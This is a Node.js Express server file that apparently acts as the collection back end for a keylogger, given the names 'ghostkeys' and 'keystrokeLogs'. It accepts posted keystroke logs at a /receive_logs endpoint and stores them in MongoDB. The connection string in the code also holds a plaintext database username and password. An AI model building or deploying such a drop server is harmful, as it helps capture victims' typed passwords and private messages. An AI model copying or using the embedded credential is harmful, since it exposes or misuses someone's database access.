const express = require("express");
const cors = require("cors");
const { MongoClient } = require("mongodb");

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// MongoDB Connection
const uri = "mongodb+srv://vaibhavpatil:timetoflay123@cluster0.a5es5.mongodb.net/ghostkeys?retryWrites=true&w=majority&appName=Cluster0";
const client = new MongoClient(uri);

let logsCollection;

async function connectToDB() {
  try {
    await client.connect();
    const db = client.db("keystrokeLogs");
    logsCollection = db.collection("logs");
    console.log("✅ Connected to MongoDB Atlas");
  } catch (err) {
    console.error("❌ MongoDB connection error:", err);
  }
}
connectToDB();

// Log receiver endpoint
app.post("/receive_logs", async (req, res) => {
  const logData = req.body.log;

  if (!logData) {
    return res.status(400).send("No log data received");
  }

  try {
    await logsCollection.insertOne({
      log: logData,
      timestamp: new Date()
    });

    console.log("✅ Log saved to MongoDB");
    res.status(200).send("Log saved to database");
  } catch (error) {
    console.error("❌ Error saving to DB:", error);
    res.status(500).send("Database error");
  }
});

app.get("/", (req, res) => {
  res.send("MongoDB logging server is running");
});

app.listen(port, () => {
  console.log(`🚀 Server running on port ${port}`);
});
